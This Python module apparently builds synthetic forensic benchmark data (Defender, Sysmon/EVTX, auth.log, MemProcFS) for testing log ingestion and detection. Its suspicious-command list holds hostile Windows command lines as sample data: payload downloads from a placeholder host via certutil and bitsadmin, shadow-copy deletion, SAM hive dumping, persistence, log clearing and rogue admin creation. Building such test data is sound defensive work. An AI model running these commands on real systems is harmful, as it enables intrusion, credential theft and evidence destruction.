"""Deterministic synthetic benchmark corpora.

Every generator is seeded and anchored to a fixed base time, so a given
(corpus version, size) pair always produces byte-identical files. The corpus
is synthetic and redistributable — it never contains real case material, real
hostnames, or routable addresses (RFC 5737 TEST-NET ranges and ``.invalid``
domains only).

Bump ``CORPUS_VERSION`` whenever generated bytes change for the same inputs;
results from different corpus versions are not comparable and the compare
tool refuses to diff them.
"""

from __future__ import annotations

import csv
import hashlib
import io
import json
import os
import random
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

CORPUS_VERSION = "1.0.0"

BASE_TIME = datetime(2026, 1, 5, 8, 0, 0, tzinfo=timezone.utc)
_ZIP_DATE_TIME = (2026, 1, 5, 8, 0, 0)

# Rows per generated file. "xs" exists for the CI smoke profile; the roadmap's
# three corpus sizes are small/medium/large.
SIZES = {"xs": 150, "small": 1_000, "medium": 5_000, "large": 20_000}

# Fraction of generated records that carry suspicious content, per detection
# corpus profile. "mixed" approximates a real case: mostly benign noise.
MIX_PROFILES = {"benign": 0.0, "mixed": 0.1, "suspicious": 0.5}

_HOSTS = ["WKS-ALPHA", "WKS-BRAVO", "SRV-FILES", "SRV-DC01"]
_USERS = ["j.doe", "a.smith", "svc-backup", "m.jones"]
_BENIGN_IPS = ["198.51.100.7", "198.51.100.23", "198.51.100.101"]
_ATTACK_IPS = ["203.0.113.9", "203.0.113.44"]

_BENIGN_PROCESSES = [
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     '"chrome.exe" --type=renderer --lang=en-US'),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs -p"),
    ("explorer.exe", "C:\\Windows\\explorer.exe", "explorer.exe"),
    ("OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
     "OUTLOOK.EXE /recycle"),
    ("Teams.exe", "C:\\Users\\j.doe\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
     "Teams.exe --system-initiated"),
    ("WINWORD.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
     '"WINWORD.EXE" /n "C:\\Users\\j.doe\\Documents\\notes.docx"'),
]

# Synthetic command lines that exercise distinct detection pattern families.
_SUSPICIOUS_CMDLINES = [
    "powershell.exe -nop -w hidden -enc UwB5AG4AdABoAGUAdABpAGMA",
    "cmd.exe /c certutil -urlcache -split -f http://stage.synthetic.invalid/payload.exe"
    " C:\\Users\\Public\\payload.exe",
    "vssadmin delete shadows /all /quiet",
    "reg save hklm\\sam C:\\Users\\Public\\sam.save",
    "schtasks /create /tn SyntheticUpdater /tr C:\\Users\\Public\\payload.exe /sc onlogon",
    "rundll32.exe C:\\Users\\Public\\stage.dll,Start",
    "wevtutil cl security",
    "net user synthadmin Passw0rd1 /add",
    "bitsadmin /transfer job /download http://stage.synthetic.invalid/a.exe"
    " C:\\Users\\Public\\a.exe",
    "wmic process call create C:\\Users\\Public\\payload.exe",
]

_SUSPICIOUS_IMAGES = [
    ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
    ("cmd.exe", "C:\\Windows\\System32\\cmd.exe"),
    ("payload.exe", "C:\\Users\\Public\\payload.exe"),
]


def _ts(index: int, step_seconds: int = 7) -> str:
    return (BASE_TIME + timedelta(seconds=step_seconds * index)).strftime(
        "%Y-%m-%dT%H:%M:%SZ"
    )


def _rng(*parts: Any) -> random.Random:
    return random.Random(f"{CORPUS_VERSION}|" + "|".join(str(p) for p in parts))


# --- Microsoft Defender Advanced Hunting JSONL ------------------------------


def build_defender_rows(count: int, suspicious_ratio: float, seed: str) -> list[dict[str, Any]]:
    rng = _rng("defender", seed, count, suspicious_ratio)
    rows: list[dict[str, Any]] = []
    pid = 3000
    while len(rows) < count:
        i = len(rows)
        host = rng.choice(_HOSTS)
        user = rng.choice(_USERS)
        suspicious = rng.random() < suspicious_ratio
        kind = rng.choices(
            ["process", "file", "network", "registry", "logon"],
            weights=[40, 20, 15, 10, 15],
        )[0]
        base = {"Timestamp": _ts(i), "DeviceName": host}
        pid += rng.randrange(2, 60)
        if kind == "process":
            if suspicious:
                cmdline = rng.choice(_SUSPICIOUS_CMDLINES)
                name = cmdline.split()[0].rsplit("\\", 1)[-1]
                folder = next(
                    (p for n, p in _SUSPICIOUS_IMAGES if n == name),
                    f"C:\\Users\\Public\\{name}",
                )
                parent = ("payload.exe", "C:\\Users\\Public\\payload.exe")
            else:
                name, folder, cmdline = rng.choice(_BENIGN_PROCESSES)
                parent = ("explorer.exe", "C:\\Windows\\explorer.exe")
            rows.append({
                **base,
                "TableName": "DeviceProcessEvents",
                "ActionType": "ProcessCreated",
                "FileName": name,
                "FolderPath": folder,
                "ProcessId": pid,
                "ProcessCommandLine": cmdline,
                "AccountName": user,
                "InitiatingProcessFileName": parent[0],
                "InitiatingProcessFolderPath": parent[1],
                "InitiatingProcessId": pid - 1,
            })
        elif kind == "file":
            if suspicious:
                rows.append({
                    **base,
                    "TableName": "DeviceFileEvents",
                    "ActionType": "FileCreated",
                    "FileName": "payload.exe",
                    "FolderPath": "C:\\Users\\Public\\payload.exe",
                    "FileOriginUrl": "http://stage.synthetic.invalid/payload.exe",
                    "InitiatingProcessFileName": "powershell.exe",
                })
            else:
                doc = f"report-{i % 97}.docx"
                rows.append({
                    **base,
                    "TableName": "DeviceFileEvents",
                    "ActionType": "FileCreated",
                    "FileName": doc,
                    "FolderPath": f"C:\\Users\\{user}\\Documents\\{doc}",
                    "InitiatingProcessFileName": "WINWORD.EXE",
                })
        elif kind == "network":
            rows.append({
                **base,
                "TableName": "DeviceNetworkEvents",
                "ActionType": "ConnectionSuccess",
                "RemoteIP": rng.choice(_ATTACK_IPS if suspicious else _BENIGN_IPS),
                "RemotePort": 443,
                "RemoteUrl": (
                    "http://stage.synthetic.invalid/checkin"
                    if suspicious else "https://updates.example.com/manifest"
                ),
                "Protocol": "Tcp",
                "LocalIP": "192.0.2.25",
                "LocalPort": 49000 + (i % 1000),
                "InitiatingProcessFileName": "payload.exe" if suspicious else "chrome.exe",
            })
        elif kind == "registry":
            if suspicious:
                rows.append({
                    **base,
                    "TableName": "DeviceRegistryEvents",
                    "ActionType": "RegistryValueSet",
                    "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows"
                                   "\\CurrentVersion\\Run",
                    "RegistryValueName": "SyntheticUpdater",
                    "RegistryValueData": "C:\\Users\\Public\\payload.exe",
                    "InitiatingProcessFileName": "powershell.exe",
                })
            else:
                rows.append({
                    **base,
                    "TableName": "DeviceRegistryEvents",
                    "ActionType": "RegistryValueSet",
                    "RegistryKey": "HKEY_LOCAL_MACHINE\\SOFTWARE\\ExampleVendor\\Agent",
                    "RegistryValueName": "LastCheck",
                    "RegistryValueData": _ts(i),
                    "InitiatingProcessFileName": "svchost.exe",
                })
        else:  # logon
            if suspicious:
                ip = rng.choice(_ATTACK_IPS)
                for burst in range(4):
                    rows.append({
                        "Timestamp": _ts(i + burst, 1),
                        "DeviceName": host,
                        "TableName": "DeviceLogonEvents",
                        "ActionType": "LogonFailed" if burst < 3 else "LogonSuccess",
                        "AccountDomain": "EXAMPLE",
                        "AccountName": user,
                        "LogonType": "RemoteInteractive",
                        "RemoteIP": ip,
                    })
            else:
                rows.append({
                    **base,
                    "TableName": "DeviceLogonEvents",
                    "ActionType": "LogonSuccess",
                    "AccountDomain": "EXAMPLE",
                    "AccountName": user,
                    "LogonType": "Interactive",
                    "RemoteIP": rng.choice(_BENIGN_IPS),
                })
    return rows[:count]


def defender_jsonl_text(count: int, suspicious_ratio: float, seed: str) -> str:
    rows = build_defender_rows(count, suspicious_ratio, seed)
    return "\n".join(json.dumps(r, separators=(",", ":")) for r in rows) + "\n"


# --- EVTX-derived JSON (Velociraptor Windows.EventLogs.* row shape) ----------


def _vr_row(eid: int, channel: str, provider: str, host: str, ts: str,
            event_data: dict[str, Any]) -> dict[str, Any]:
    return {
        "System": {
            "EventID": eid,
            "Channel": channel,
            "Provider": {"Name": provider},
            "Computer": host,
            "TimeCreated": {"SystemTime": ts},
        },
        "EventData": event_data,
    }


def build_evtx_rows(count: int, suspicious_ratio: float, seed: str) -> list[dict[str, Any]]:
    rng = _rng("evtx", seed, count, suspicious_ratio)
    sysmon = ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")
    rows: list[dict[str, Any]] = []
    pid = 5000
    for i in range(count):
        host = rng.choice(_HOSTS)
        user = rng.choice(_USERS)
        ts = _ts(i)
        suspicious = rng.random() < suspicious_ratio
        kind = rng.choices(
            ["proc", "net", "file", "logon", "service", "logclear"],
            weights=[40, 15, 15, 20, 8, 2],
        )[0]
        pid += rng.randrange(2, 40)
        if kind == "proc":
            if suspicious:
                cmdline = rng.choice(_SUSPICIOUS_CMDLINES)
                name = cmdline.split()[0].rsplit("\\", 1)[-1]
                image = next(
                    (p for n, p in _SUSPICIOUS_IMAGES if n == name),
                    f"C:\\Users\\Public\\{name}",
                )
                parent = "C:\\Users\\Public\\payload.exe"
            else:
                name, image, cmdline = rng.choice(_BENIGN_PROCESSES)
                parent = "C:\\Windows\\explorer.exe"
            rows.append(_vr_row(1, *sysmon, host, ts, {
                "UtcTime": ts,
                "Image": image,
                "ProcessId": str(pid),
                "ParentProcessId": str(pid - 1),
                "CommandLine": cmdline,
                "User": f"EXAMPLE\\{user}",
                "ParentImage": parent,
                "ParentCommandLine": parent.rsplit("\\", 1)[-1],
            }))
        elif kind == "net":
            rows.append(_vr_row(3, *sysmon, host, ts, {
                "UtcTime": ts,
                "Image": "C:\\Users\\Public\\payload.exe" if suspicious
                         else "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "ProcessId": str(pid),
                "Protocol": "tcp",
                "DestinationIp": rng.choice(_ATTACK_IPS if suspicious else _BENIGN_IPS),
                "DestinationPort": "443",
            }))
        elif kind == "file":
            rows.append(_vr_row(11, *sysmon, host, ts, {
                "UtcTime": ts,
                "Image": "C:\\Users\\Public\\payload.exe" if suspicious
                         else "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "ProcessId": str(pid),
                "TargetFilename": (
                    "C:\\Users\\Public\\stage.dll" if suspicious
                    else f"C:\\Users\\{user}\\Documents\\report-{i % 97}.docx"
                ),
            }))
        elif kind == "logon":
            eid = 4625 if suspicious else 4624
            rows.append(_vr_row(
                eid, "Security", "Microsoft-Windows-Security-Auditing", host, ts, {
                    "TargetUserName": user,
                    "TargetDomainName": "EXAMPLE",
                    "LogonType": "10" if suspicious else "2",
                    "IpAddress": rng.choice(_ATTACK_IPS if suspicious else _BENIGN_IPS),
                },
            ))
        elif kind == "service":
            rows.append(_vr_row(7045, "System", "Service Control Manager", host, ts, {
                "ServiceName": "SyntheticSvc" if suspicious else "ExampleAgent",
                "ImagePath": (
                    "C:\\Users\\Public\\payload.exe" if suspicious
                    else "C:\\Program Files\\ExampleVendor\\agent.exe"
                ),
                "StartType": "auto start",
            }))
        else:  # logclear — only meaningful as suspicious signal
            rows.append(_vr_row(
                1102, "Security", "Microsoft-Windows-Eventlog", host, ts,
                {"SubjectUserName": user},
            ))
    return rows


def evtx_jsonl_text(count: int, suspicious_ratio: float, seed: str) -> str:
    rows = build_evtx_rows(count, suspicious_ratio, seed)
    return "\n".join(json.dumps(r, separators=(",", ":")) for r in rows) + "\n"


# --- Generic artifact CSV (prefetch-like rows, generic ingestion path) -------


def artifact_csv_text(count: int, seed: str) -> str:
    rng = _rng("csv", seed, count)
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator="\n")
    writer.writerow(["Timestamp", "Hostname", "Name", "Path", "RunCount"])
    programs = [name for name, _path, _cmd in _BENIGN_PROCESSES]
    for i in range(count):
        name = rng.choice(programs)
        writer.writerow([
            _ts(i),
            rng.choice(_HOSTS),
            f"{name.upper()}-{i % 251:08X}.pf",
            f"C:\\Windows\\Prefetch\\{name.upper()}-{i % 251:08X}.pf",
            rng.randrange(1, 200),
        ])
    return buf.getvalue()


# --- Linux auth.log (RFC3164) -------------------------------------------------


def linux_auth_log_text(count: int, suspicious_ratio: float, seed: str) -> str:
    rng = _rng("linux", seed, count, suspicious_ratio)
    lines: list[str] = []
    host = "srv-web01"
    pid = 1200
    while len(lines) < count:
        i = len(lines)
        stamp = (BASE_TIME + timedelta(seconds=11 * i)).strftime("%b %e %H:%M:%S")
        user = rng.choice(_USERS)
        pid += rng.randrange(1, 9)
        if rng.random() < suspicious_ratio:
            attack_ip = rng.choice(_ATTACK_IPS)
            variant = rng.choice(["bruteforce", "rootlogin", "useradd"])
            if variant == "bruteforce":
                for burst in range(5):
                    burst_stamp = (
                        BASE_TIME + timedelta(seconds=11 * i + burst)
                    ).strftime("%b %e %H:%M:%S")
                    lines.append(
                        f"{burst_stamp} {host} sshd[{pid}]: Failed password for invalid "
                        f"user admin from {attack_ip} port {40000 + burst} ssh2"
                    )
                lines.append(
                    f"{stamp} {host} sshd[{pid}]: Accepted password for {user} "
                    f"from {attack_ip} port 40006 ssh2"
                )
            elif variant == "rootlogin":
                lines.append(
                    f"{stamp} {host} sshd[{pid}]: Accepted password for root "
                    f"from {attack_ip} port 51022 ssh2"
                )
            else:
                lines.append(
                    f"{stamp} {host} useradd[{pid}]: new user: name=synthetic-svc, "
                    f"UID=1099, GID=1099, home=/home/synthetic-svc, shell=/bin/bash"
                )
        else:
            variant = rng.choice(["login", "sudo", "cron", "logout"])
            benign_ip = rng.choice(_BENIGN_IPS)
            if variant == "login":
                lines.append(
                    f"{stamp} {host} sshd[{pid}]: Accepted publickey for {user} "
                    f"from {benign_ip} port 50812 ssh2: RSA SHA256:synthetickeyfingerprint"
                )
            elif variant == "sudo":
                lines.append(
                    f"{stamp} {host} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; "
                    f"USER=root ; COMMAND=/usr/bin/systemctl status nginx"
                )
            elif variant == "cron":
                lines.append(
                    f"{stamp} {host} CRON[{pid}]: (root) CMD (run-parts /etc/cron.hourly)"
                )
            else:
                lines.append(
                    f"{stamp} {host} sshd[{pid}]: Disconnected from user {user} "
                    f"{benign_ip} port 50812"
                )
    return "\n".join(lines[:count]) + "\n"


# --- MemProcFS-derived forensic artifacts ------------------------------------


def write_memprocfs_artifacts(root: Path, count: int, seed: str) -> dict[str, int]:
    """Write a synthetic MemProcFS forensic CSV artifact tree under ``root``.

    Mirrors the layout ``ingest_memprocfs_artifacts_sync`` consumes:
    ``forensic/csv/{process,findevil,timeline_all}.csv``. No memory image is
    required. Returns per-file row counts.
    """
    rng = _rng("memprocfs", seed, count)
    csv_dir = root / "forensic" / "csv"
    csv_dir.mkdir(parents=True, exist_ok=True)
    n_procs = max(count // 10, 25)

    proc_buf = io.StringIO()
    writer = csv.writer(proc_buf, lineterminator="\n")
    writer.writerow(["PID", "PPID", "Name", "Path", "Cmdline", "CreateTime"])
    stamp = BASE_TIME.strftime("%Y-%m-%d %H:%M:%S")
    for i in range(n_procs):
        pid = 400 + i * 4
        if i % 17 == 0:
            name, path, cmd = (
                "payload.exe", "C:\\Users\\Public\\payload.exe",
                rng.choice(_SUSPICIOUS_CMDLINES),
            )
        else:
            name, path, cmd = rng.choice(_BENIGN_PROCESSES)
        writer.writerow([pid, max(4, pid - 4), name, path, cmd, stamp])
    (csv_dir / "process.csv").write_text(proc_buf.getvalue(), encoding="utf-8", newline="\n")

    evil_buf = io.StringIO()
    writer = csv.writer(evil_buf, lineterminator="\n")
    writer.writerow(["PID", "Process", "Reason"])
    n_evil = max(n_procs // 20, 3)
    for i in range(n_evil):
        writer.writerow([400 + i * 68, "payload.exe", "PE_INJECT"])
    (csv_dir / "findevil.csv").write_text(evil_buf.getvalue(), encoding="utf-8", newline="\n")

    tl_buf = io.StringIO()
    writer = csv.writer(tl_buf, lineterminator="\n")
    writer.writerow(["Time", "Type", "Name"])
    kinds = ["Process", "File", "Registry", "Net"]
    for i in range(count):
        writer.writerow([
            (BASE_TIME + timedelta(seconds=3 * i)).strftime("%Y-%m-%d %H:%M:%S"),
            kinds[i % len(kinds)],
            f"C:\\Windows\\Prefetch\\ENTRY-{i % 509:08X}.pf",
        ])
    (csv_dir / "timeline_all.csv").write_text(tl_buf.getvalue(), encoding="utf-8", newline="\n")

    return {"process.csv": n_procs, "findevil.csv": n_evil, "timeline_all.csv": count}


# --- Corpus assembly ----------------------------------------------------------


def _write_text(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def _write_zip(path: Path, members: dict[str, str]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name in sorted(members):
            info = zipfile.ZipInfo(name, date_time=_ZIP_DATE_TIME)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, members[name])


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            digest.update(chunk)
    return digest.hexdigest()


def manifest_stub(size_labels: list[str] | None = None) -> dict[str, Any]:
    """Manifest with row counts but no files/hashes — enough to name and size
    benchmarks (e.g. for listing) without generating the corpus."""
    labels = size_labels or list(SIZES)
    files: dict[str, dict[str, Any]] = {}
    for label in labels:
        count = SIZES[label]
        for rel in (
            f"ingest/defender_{label}.jsonl", f"ingest/evtx_{label}.jsonl",
            f"ingest/artifact_{label}.csv", f"ingest/linux_auth_{label}.log",
        ):
            files[rel] = {"rows": count}
        files[f"ingest/mixed_{label}.zip"] = {"rows": (count // 4) * 4}
        for mix in MIX_PROFILES:
            files[f"detection/detect_{mix}_{label}.jsonl"] = {"rows": count}
        n_procs = max(count // 10, 25)
        base = f"memory/memprocfs_{label}/forensic/csv"
        files[f"{base}/process.csv"] = {"rows": n_procs}
        files[f"{base}/findevil.csv"] = {"rows": max(n_procs // 20, 3)}
        files[f"{base}/timeline_all.csv"] = {"rows": count}
    return {
        "corpus_version": CORPUS_VERSION,
        "sizes": {label: SIZES[label] for label in labels},
        "files": dict(sorted(files.items())),
    }


def generate_corpus(root: Path, size_labels: list[str] | None = None) -> dict[str, Any]:
    """Generate the benchmark corpus under ``root`` and return its manifest.

    The manifest (also written to ``root/manifest.json``) records the corpus
    version and the SHA-256, byte size, and logical row count of every file,
    so determinism is checkable and results are traceable to exact inputs.
    """
    labels = size_labels or list(SIZES)
    files: dict[str, dict[str, Any]] = {}

    def record(rel: str, rows: int) -> None:
        path = root / rel
        files[rel] = {"sha256": _sha256(path), "bytes": path.stat().st_size, "rows": rows}

    for label in labels:
        count = SIZES[label]

        rel = f"ingest/defender_{label}.jsonl"
        _write_text(root / rel, defender_jsonl_text(count, MIX_PROFILES["mixed"], label))
        record(rel, count)

        rel = f"ingest/evtx_{label}.jsonl"
        _write_text(root / rel, evtx_jsonl_text(count, MIX_PROFILES["mixed"], label))
        record(rel, count)

        rel = f"ingest/artifact_{label}.csv"
        _write_text(root / rel, artifact_csv_text(count, label))
        record(rel, count)

        rel = f"ingest/linux_auth_{label}.log"
        _write_text(root / rel, linux_auth_log_text(count, MIX_PROFILES["mixed"], label))
        # RFC3164 lines carry no year; the parser infers it from file mtime,
        # so pin mtime to the corpus base time for determinism.
        os.utime(root / rel, (BASE_TIME.timestamp(), BASE_TIME.timestamp()))
        record(rel, count)

        member = count // 4
        rel = f"ingest/mixed_{label}.zip"
        _write_zip(root / rel, {
            "collection/defender.jsonl": defender_jsonl_text(
                member, MIX_PROFILES["mixed"], f"zip-{label}"),
            "collection/eventlogs.jsonl": evtx_jsonl_text(
                member, MIX_PROFILES["mixed"], f"zip-{label}"),
            "collection/prefetch.csv": artifact_csv_text(member, f"zip-{label}"),
            "collection/auth.log": linux_auth_log_text(
                member, MIX_PROFILES["mixed"], f"zip-{label}"),
        })
        record(rel, member * 4)

        for mix, ratio in MIX_PROFILES.items():
            rel = f"detection/detect_{mix}_{label}.jsonl"
            _write_text(root / rel, defender_jsonl_text(count, ratio, f"detect-{mix}-{label}"))
            record(rel, count)

        mem_counts = write_memprocfs_artifacts(
            root / f"memory/memprocfs_{label}", count, label)
        for name, rows in sorted(mem_counts.items()):
            record(f"memory/memprocfs_{label}/forensic/csv/{name}", rows)

    manifest = {
        "corpus_version": CORPUS_VERSION,
        "base_time": BASE_TIME.isoformat(),
        "sizes": {label: SIZES[label] for label in labels},
        "files": dict(sorted(files.items())),
    }
    (root / "manifest.json").write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8",
    )
    return manifest
